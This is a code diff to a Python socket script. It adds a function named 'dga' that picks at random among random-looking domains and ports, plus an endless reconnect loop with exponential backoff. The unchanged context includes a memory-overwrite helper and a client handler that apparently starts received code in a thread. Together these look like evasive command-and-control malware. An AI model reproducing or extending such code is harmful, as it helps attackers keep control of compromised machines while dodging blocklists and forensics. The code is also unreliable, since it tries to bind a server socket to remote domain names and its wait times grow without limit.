@@ -6,6 +6,7 @@ import struct
 import gc
 import random
 import string
+import time
 
 
 def overwrite_memory(var):
@@ -75,24 +76,34 @@ def handle_client(conn, addr):
             code_thread.start()
 
 
+def dga():
+    host = random.choice(["127.0.0.1", "sBoAi06U9K1xa2wgJkl5O.com.br", "yeLA3noXsNXxai.net", "FqH513nq126tsGf.com"])
+    port = random.choice([3000, 3001, 4000, 4001, 8000, 8080, 50055, 12345])
+    return (host, port)
+
+
 def main():
-    port = 12345
+    retry_count = 0
+    initial_backoff = 1
 
-    with open('./hosts', 'r') as file:
-        for line in file:
-            host = line.rstrip()
+    while True:
+        host, port = dga()
 
-            try:
-                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
-                    server_socket.bind((host, port))
-                    server_socket.listen(1)
+        print(host, port)
 
-                    while True:
-                        conn, addr = server_socket.accept()
-                        client_thread = threading.Thread(target=handle_client, args=(conn, addr))
-                        client_thread.start()
-            except:
-                pass
+        try:
+            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
+                server_socket.bind((host, port))
+                server_socket.listen(1)
+
+                while True:
+                    conn, addr = server_socket.accept()
+                    client_thread = threading.Thread(target=handle_client, args=(conn, addr))
+                    client_thread.start()
+        except:
+            wait_time = initial_backoff * (2 ** retry_count)
+            time.sleep(wait_time)
+            retry_count += 1
 
 
 if __name__ == "__main__":
